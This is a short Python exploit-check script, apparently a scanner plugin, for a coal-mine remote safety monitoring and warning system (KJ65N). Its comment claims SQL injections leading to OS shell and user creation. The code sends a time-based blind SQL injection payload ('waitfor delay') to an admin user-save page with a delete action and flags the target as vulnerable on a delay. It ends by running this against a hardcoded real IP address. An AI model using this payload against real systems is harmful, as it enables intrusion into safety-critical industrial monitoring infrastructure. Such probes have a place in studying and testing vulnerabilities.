#!/usr/bin/env python
# -*- coding: utf-8 -*-
#KJ65N煤矿远程监控安全预警系统 通用 sql注入3处(可直接os-shell 添加用户)
#refer:http://www.wooyun.org/bugs/wooyun-2010-0148855
#__author__ = 'xq17'

import urlparse
import time

def assign(service, arg):
    if service == 'kj65n_monitor':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    start_time1=time.time()
    code1, head, res, errcode, _ = curl.curl2(arg)
    true_time=time.time()-start_time1
    start_time2=time.time()
    
    payloads = ("admin/userSave.asp?userid=123456789%20waitfor%20delay%20'0:0:5&do=delete",
)
    for p in payloads:
        
        url = arg + p
        code2, head, res, errcode, _ = curl.curl2(url)
        flase_time=time.time()-start_time2
        if code1==200 and code2==200 and true_time<2 and flase_time>5:
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('kj65n_monitor','http://211.141.82.13:8001/')[1])